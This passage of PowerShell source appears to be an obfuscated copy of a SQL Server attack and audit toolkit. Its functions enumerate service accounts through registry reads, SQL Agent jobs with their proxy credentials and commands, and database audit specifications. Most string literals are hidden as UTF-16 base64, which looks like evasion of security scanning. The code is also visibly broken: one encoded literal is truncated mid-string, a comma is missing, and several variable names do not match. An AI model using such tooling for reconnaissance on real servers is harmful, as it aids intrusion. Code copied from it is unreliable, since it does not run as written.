        $WinRoleCheck = [System.Security.Principal.WindowsBuiltInRole]::Administrator        
        $WinGroups.IsInRole($WinRoleCheck)
    }
    End
    {
    }
}
Function  Get-SQLServiceAccount
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblServiceAccount = New-Object -TypeName System.Data.DataTable
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
        if($IsSysadmin -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
        {
            $SysadminSetup = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQAtACAARwBlAHQAIABTAFEATAAgAFMAZQByAHYAZQByACAAQgByAG8AdwBzAGUAcgAgAC0AIABTAHQAYQB0AGkAYwAgAEwAbwBjAGEAdABpAG8AbgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAFgARQBDAFUAVABFACAAIAAgACAAIAAgACAAbQBhAHMAdABlAHIALgBkAGIAbwAuAHgAcABfAGkAbgBzAHQAYQBuAGMAZQBfAHIAZQBnAHIAZQBhAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAByAG8AbwB0AGsAZQB5ACAAIAAgACAAIAAgAD0AIABOACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAawBlAHkAIAAgACAAIAAgACAAIAAgACAAIAA9ACAATgAnAFMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAUwBlAHIAdgBpAGMAZQBzAFwAUwBRAEwAQgByAG8AdwBzAGUAcgAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUAXwBuAGEAbQBlACAAIAAgAD0AIABOACcATwBiAGoAZQBjAHQATgBhAG0AZQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUAIAAgACAAIAAgACAAIAAgAD0AIABAAEIAcgBvAHcAcwBlAHIATABvAGcAaQBuACAATwBVAFQAUABVAFQADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0ALQAgAEcAZQB0ACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAFcAcgBpAHQAZQByACAALQAgAFMAdABhAHQAaQBjACAATABvAGMAYQB0AGkAbwBuAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUAWABFAEMAVQBUAEUAIAAgACAAIAAgACAAIABtAGEAcwB0AGUAcgAuAGQAYgBvAC4AeABwAF8AaQBuAHMAdABhAG4AYwBlAF8AcgBlAGcAcgBlAGEAZAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAHIAbwBvAHQAawBlAHkAIAAgACAAIAAgACAAPQAgAE4AJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQABrAGUAeQAgACAAIAAgACAAIAAgACAAIAAgAD0AIABOACcAUwBZAFMAVABFAE0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABTAGUAcgB2AGkAYwBlAHMAXABTAFEATABXAHIAaQB0AGUAcgAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUAXwBuAGEAbQBlACAAIAAgAD0AIABOACcATwBiAGoAZQBjAHQATgBhAG0AZQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUAIAAgACAAIAAgACAAIAAgAD0AIABAAFcAcgBpAHQAZQByAEwAbwBnAGkAbgAgAE8AVQBUAFAAVQBUAA0ACgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAtAC0AIABHAGUAdAAgAE0AUwBPAEwAQQBQACAALQAgAEMAYQBsAGMAdQBsAGEAdABlAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBYAEUAQwBVAFQARQAJAAkAbQBhAHMAdABlAHIALgBkAGIAbwAuAHgAcABfAGkAbgBzAHQAYQBuAGMAZQBfAHIAZQBnAHIAZQBhAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAATgAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFACcALAAgAEAATQBTAE8ATABBAFAASQBuAHMAdABhAG4AYwBlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAATgAnAE8AYgBqAGUAYwB0AE4AYQBtAGUAJwAsAEAAQQBuAGEAbAB5AHMAaQBzAEwAbwBnAGkAbgAgAE8AVQBUAFAAVQBUAA0ACgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAtAC0AIABHAGUAdAAgAFIAZQBwAG8AcgB0AGkAbgBnACAALQAgAEMAYQBsAGMAdQBsAGEAdABlAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBYAEUAQwBVAFQARQAJAAkAbQBhAHMAdABlAHIALgBkAGIAbwAuAHgAcABfAGkAbgBzAHQAYQBuAGMAZQBfAHIAZQBnAHIAZQBhAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAATgAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFACcALAAgAEAAUgBlAHAAbwByAHQASQBuAHMAdABhAG4AYwBlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAATgAnAE8AYgBqAGUAYwB0AE4AYQBtAGUAJwAsAEAAUgBlAHAAbwByAHQATABvAGcAaQBuACAATwBVAFQAUABVAFQADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0ALQAgAEcAZQB0ACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAEQAVABTACAAUwBlAHIAdgBlAHIAIAAvACAAQQBuAGEAbAB5AHMAaQBzACAALQAgAEMAYQBsAHUAbABhAHQAZQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUAWABFAEMAVQBUAEUACQAJAG0AYQBzAHQAZQByAC4AZABiAG8ALgB4AHAAXwBpAG4AcwB0AGEAbgBjAGUAXwByAGUAZwByAGUAYQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE4AJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAnACwAIABAAEkAbgB0AGUAZwByAGEAdABpAG8AbgBWAGUAcgBzAGkAbwBuACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE4AJwBPAGIAagBlAGMAdABOAGEAbQBlACcALABAAEkAbgB0AGUAZwByAGEAdABpAG8AbgBEAHQAcwBMAG8AZwBpAG4AIABPAFUAVABQAFUAVAA=')))
            $SysadminQuery = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CQAsAFsAQgByAG8AdwBzAGUAcgBMAG8AZwBpAG4AXQAgAD0AIABAAEIAcgBvAHcAcwBlAHIATABvAGcAaQBuACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAWwBXAHIAaQB0AGUAcgBMAG8AZwBpAG4AXQAgAD0AIABAAFcAcgBpAHQAZQByAEwAbwBnAGkAbgAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsAQQBuAGEAbAB5AHMAaQBzAEwAbwBnAGkAbgBdACAAPQAgAEAAQQBuAGEAbAB5AHMAaQBzAEwAbwBnAGkAbgAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsAUgBlAHAAbwByAHQATABvAGcAaQBuAF0AIAA9ACAAQABSAGUAcABvAHIAdABMAG8AZwBpAG4ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAWwBJAG4AdABlAGcAcgBhAHQAaQBvAG4ATABvAGcAaQBuAF0AIAA9ACAAQABJAG4AdABlAGcAcgBhAHQAaQBvAG4ARAB0AHMATABvAGcAaQBuAA==')))
        }
        else
        {
            $SysadminSetup = ''
            $SysadminQuery = ''
        }
        $Query = "  -- Setup variables
            DECLARE		@SQLServerInstance	VARCHAR(250)
            DECLARE		@MSOLAPInstance		VARCHAR(250)
            DECLARE		@ReportInstance 	VARCHAR(250)
            DECLARE		@AgentInstance	 	VARCHAR(250)
            DECLARE		@IntegrationVersion	VARCHAR(250)
            DECLARE		@DBEngineLogin		VARCHAR(100)
            DECLARE		@AgentLogin		VARCHAR(100)
            DECLARE		@BrowserLogin		VARCHAR(100)
            DECLARE     	@WriterLogin		VARCHAR(100)
            DECLARE		@AnalysisLogin		VARCHAR(100)
            DECLARE		@ReportLogin		VARCHAR(100)
            DECLARE		@IntegrationDtsLogin	VARCHAR(100)

            -- Get Service Paths for default and name instance
            if @@SERVICENAME = 'MSSQLSERVER' or @@SERVICENAME = HOST_NAME()
            BEGIN
            -- Default instance paths
            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
            set @MSOLAPInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLServerOLAPService'
            set @ReportInstance = 'SYSTEM\CurrentControlSet\Services\ReportServer'
            set @AgentInstance = 'SYSTEM\CurrentControlSet\Services\SQLSERVERAGENT'
            set @IntegrationVersion  = 'SYSTEM\CurrentControlSet\Services\MsDtsServer'+ SUBSTRING(CAST(SERVERPROPERTY('productversion') AS VARCHAR(255)),0, 3) + '0'
            END
            ELSE
            BEGIN
            -- Named instance paths
            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$' + cast(@@SERVICENAME as varchar(250))
            set @MSOLAPInstance = 'SYSTEM\CurrentControlSet\Services\MSOLAP$' + cast(@@SERVICENAME as varchar(250))
            set @ReportInstance = 'SYSTEM\CurrentControlSet\Services\ReportServer$' + cast(@@SERVICENAME as varchar(250))
            set @AgentInstance = 'SYSTEM\CurrentControlSet\Services\SQLAgent$' + cast(@@SERVICENAME as varchar(250))
            set @IntegrationVersion  = 'SYSTEM\CurrentControlSet\Services\MsDtsServer'+ SUBSTRING(CAST(SERVERPROPERTY('productversion') AS VARCHAR(255)),0, 3) + '0'
            END

            -- Get SQL Server - Calculated
            EXECUTE		master.dbo.xp_instance_regread
            N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
            N'ObjectName',@DBEngineLogin OUTPUT

            -- Get SQL Server Agent - Calculated
            EXECUTE		master.dbo.xp_instance_regread
            N'HKEY_LOCAL_MACHINE', @AgentInstance,
            N'ObjectName',@AgentLogin OUTPUT

            $SysadminSetup

            -- Dislpay results
            SELECT		'$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            [DBEngineLogin] = @DBEngineLogin,
            [AgentLogin] = @AgentLogin
        $SysadminQuery"
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $TblServiceAccount = $TblServiceAccount + $TblResults
    }
    End
    {
        $TblServiceAccount
    }
}
Function  Get-SQLAgentJob
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only return SQL Agent jobs for specific subsystems.')]
         [ValidateSet("TSQL","PowerShell","CMDEXEC","PowerShell","ActiveScripting","ANALYSISCOMMAND","ANALYSISQUERY","Snapshot","Distribution","LogReader","Merge","QueueReader")]
        [String]$SubSystem,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only return SQL Agent jobs that have a command that includes a specific keyword.')]
        [String]$Keyword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only return SQL Agent jobs using a proxy credentials.')]
        [Switch]$UsingProxyCredential,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only return SQL Agent jobs using a specific proxy credential.')]
        [String]$ProxyCredential,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $SuppressVerbose){
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAIABTAGUAcgB2AGUAcgAgAEEAZwBlAG4AdAAgAEoAbwBiACAAUwBlAGEAcgBjAGgAIABTAHQAYQByAHQAaQBuAGcALgAuAC4A')))
        }
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))     
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAE4AYQBtAGUA'))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SgBvAGIAXwBJAGQA'))))                                                                                                                                                                                        
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SgBvAGIAXwBOAGEAbQBlAA=='))))                                                                                                                                                                                                 
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SgBvAGIAXwBEAGUAcwBjAHIAaQBwAHQAaQBvAG4A'))))  
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SgBvAGIAXwBPAHcAbgBlAHIA'))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AF8ASQBkAA=='))))  
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AF8AQwByAGUAZABlAG4AdABpAGEAbAA='))))                                                                                                                                                                                                          
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAZQBfAEMAcgBlAGEAdABlAGQA')))) 
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABfAFIAdQBuAF8ARABhAHQAZQA='))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGEAYgBs
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA'))))                                                                                                                                                                                        
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGUAcABfAE4AYQBtAGUA'))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAUwB5AHMAdABlAG0A'))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZAA='))))          
        if($SubSystem)
        {
            $SubSystemFilter = " and steps.subsystem like '$SubSystem'"
        }
        else
        {
            $SubSustemFilter = ''
        }    
        if($Keyword)
        {
            $KeywordFilter = " and steps.command like '%$Keyword%'"
        }
        else
        {
            $KeywordFilter = ''
        }   
        if($UsingProxyCredential)
        {
            $UsingProxyCredFilter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAHMAdABlAHAAcwAuAHAAcgBvAHgAeQBfAGkAZAAgAD4AIAAwAA==')))
        }
        else
        {
            $UsingProxyCredFilter = ''
        } 
        if($ProxyCredential)
        {
            $ProxyCredFilter = " and proxies.name like '$ProxyCredential'"
        }
        else
        {
            $ProxyCredFilter = ''
        }                                                                                                                                                                                                 
    }
    Process
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($DAC)
        {
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
        }
        else
        {
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
        }
        try
        {
            $Connection.Open()
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."                
            }
            $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $CurrentLogin = $ServerInfo.CurrentLogin
            $ComputerName = $ServerInfo.ComputerName
            $Sysadmin = $ServerInfo.IsSysadmin
            $IsAgentServiceEnabled = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIAAxACAARgBSAE8ATQAgAHMAeQBzAHAAcgBvAGMAZQBzAHMAZQBzACAAVwBIAEUAUgBFACAATABFAEYAVAAoAHAAcgBvAGcAcgBhAG0AXwBuAGEAbQBlACwAIAA4ACkAIAA9ACAAJwBTAFEATABBAGcAZQBuAHQAJwA='))) -Username $Username -Password $Password -SuppressVerbose
            if ($IsAgentServiceEnabled)
            {
                if(-not $SuppressVerbose){
                    Write-Verbose -Message "$Instance : - SQL Server Agent service enabled."
                }
            }
            else
            {
                if(-not $SuppressVerbose){
                    Write-Verbose -Message "$Instance : - SQL Server Agent service has not been started."
                }
            }
            $AddJobPrivs = Get-SQLDatabaseRoleMember -Username $Username -Password $Password -Instance $Instance -DatabaseName msdb  -SuppressVerbose| % { 
                if($_.RolePrincipalName -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAQQBnAGUAbgB0AFUAcwBlAHIAUgBvAGwAZQB8AFMAUQBMAEEAZwBlAG4AdABSAGUAYQBkAGUAcgBSAG8AbABlAHwAUwBRAEwAQQBnAGUAbgB0AE8AcABlAHIAYQB0AG8AcgBSAG8AbABlAA==')))) {
                    if ($_.PrincipalName -eq $CurrentLogin) { $_ }
                }
            }
            if($AgentJobPrivs -or ($Sysadmin -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))))
            {
                if(-not $SuppressVerbose){
                    Write-Verbose -Message "$Instance : - Attempting to list existing agent jobs as $CurrentLogin."
                }
                $Query = "SELECT 	steps.database_name,
	                            job.job_id as [JOB_ID],
	                            job.name as [JOB_NAME],
	                            job.description as [JOB_DESCRIPTION],
								SUSER_SNAME(job.owner_sid) as [JOB_OWNER],
								steps.proxy_id,
								proxies.name as [proxy_account],
	                            job.enabled,
	                            steps.server,
	                            job.date_created,   
                                steps.last_run_date,								                             
								steps.step_name,
								steps.subsystem,
	                            steps.command
                            FROM [msdb].[dbo].[sysjobs] job
                            INNER JOIN [msdb].[dbo].[sysjobsteps] steps        
	                            ON job.job_id = steps.job_id
							left join [msdb].[dbo].[sysproxies] proxies
							 on steps.proxy_id = proxies.proxy_id
                            WHERE 1=1
                            $KeywordFilter
                            $SubSystemFilter
                            $ProxyCredFilter
                            $UsingProxyCredFilter"
                $result = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose
                if(!($result)) {
                    Write-Verbose -Message "$Instance : - Either no jobs exist or the current login ($CurrentLogin) doesn't have the privileges to view them."
                    return
                }
                $AgentJobCount = $result.rows.count
                if(-not $SuppressVerbose){
                    Write-Verbose -Message "$Instance : - $AgentJobCount agent jobs found."
                }
                $result | 
                %{
                    $null = $TblResults.Rows.Add($ComputerName,
                    $Instance,
                    $_.database_name
                    $_.JOB_ID,                                                                                                                                                                                        
                    $_.JOB_NAME, 
                    $_.JOB_DESCRIPTION,                                                                                                                                                                                                         
                    $_.JOB_OWNER,
                    $_.proxy_id,    
                    $_.proxy_account, 
                    $_.date_created,
                    $_.last_run_date,                                                                                                                                                                                  
                    $_.enabled,                                                                                                                                                                                                     
                    $_.server,                                                                                                                                                                                        
                    $_.step_name,
                    $_.subsystem,
                    $_.command)
                }
            }
            else
            {
                if(-not $SuppressVerbose){
                    Write-Verbose -Message "$Instance : - The current login ($CurrentLogin) does not have any agent privileges."
                }
                return
            }
            $Connection.Close()
            $Connection.Dispose()
        }
        catch
        {
            if(-not $SuppressVerbose)
            {
                $ErrorMessage = $_.Exception.Message
                Write-Verbose -Message "$Instance : Connection Failed."
            }
        }        
    }
    End
    {
        if(-not $SuppressVerbose){
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAIABTAGUAcgB2AGUAcgAgAEEAZwBlAG4AdAAgAEoAbwBiACAAUwBlAGEAcgBjAGgAIABDAG8AbQBwAGwAZQB0AGUALgA=')))
        }
        $TotalAgentCount = $TblResults.rows.Count
        $SummarySubSystem = $TblResults | group SubSystem | Select Name, Count | sort Count -Descending
        $SummaryProxyAccount = $TblResults | select proxy_credential -Unique | measure | select Count -ExpandProperty Count
        $SummaryServer = $TblResults | select ComputerName -Unique | measure |  select Count -ExpandProperty Count
        $SummaryInstance = $TblResults | select Instance -Unique | measure |  select Count -ExpandProperty Count
        if(-not $SuppressVerbose){
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0A')))
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBnAGUAbgB0ACAASgBvAGIAIABTAHUAbQBtAGEAcgB5AA=='))) 
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0A')))
            Write-Verbose -Message " $TotalAgentCount jobs found"
            Write-Verbose -Message " $SummaryServer affected systems"
            Write-Verbose -Message " $SummaryInstance affected SQL Server instances"
            Write-Verbose -Message " $SummaryProxyAccount proxy credentials used"
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0A')))
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBnAGUAbgB0ACAASgBvAGIAIABTAHUAbQBtAGEAcgB5ACAAYgB5ACAAUwB1AGIAUwB5AHMAdABlAG0A'))) 
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0A')))
            $SummarySubSystem | 
            % {
                $SubSystem_Name = $_.Name
                $SubSystem_Count = $_.Count
                Write-Verbose -Message " $SubSystem_Count $SubSystem_Name Jobs"
            }
            Write-Verbose -Message " $TotalAgentCount Total"
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0A')))
        }
        $TblResults
    }
}
Function  Get-SQLAuditDatabaseSpec
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Audit name.')]
        [string]$AuditName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Specification name.')]
        [string]$AuditSpecification,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Audit action name.')]
        [string]$AuditAction,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblAuditDatabaseSpec = New-Object -TypeName System.Data.DataTable
        if($AuditName)
        {
            $AuditNameFilter = " and a.name like '%$AuditName%'"
        }
        else
        {
            $AuditNameFilter = ''
        }
        if($AuditSpecification)
        {
            $SpecNameFilter = " and s.name like '%$AuditSpecification%'"
        }
        else
        {
            $SpecNameFilter = ''
        }
        if($AuditAction)
        {
            $ActionNameFilter = " and d.audit_action_name like '%$AuditAction%'"
        }
        else
        {
            $ActionNameFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            audit_id as [AuditId],
            a.name as [AuditName],
            s.name as [AuditSpecification],
            d.audit_action_id as [AuditActionId],
            d.audit_action_name as [AuditAction],
	        d.major_id,
	        OBJECT_NAME(d.major_id) as object,	
            s.is_state_enabled,
            d.is_group,
            s.create_date,
            s.modify_date,
            d.audited_result
            FROM sys.server_audits AS a
            JOIN sys.database_audit_specifications AS s
            ON a.audit_guid = s.audit_guid
            JOIN sys.database_audit_specification_details AS d
            ON s.database_specification_id = d.database_specification_id WHERE 1=1
            $AuditNameFilter
            $SpecNameFilter
        $ActionNameFilter"
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose
        $TblAuditDatabaseSpec = $TblAuditDatabaseSpec + $TblResults
    }
    End
    {
        $TblAuditDatabaseSpec
    }
}
Function  Get-SQLAuditServerSpec
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
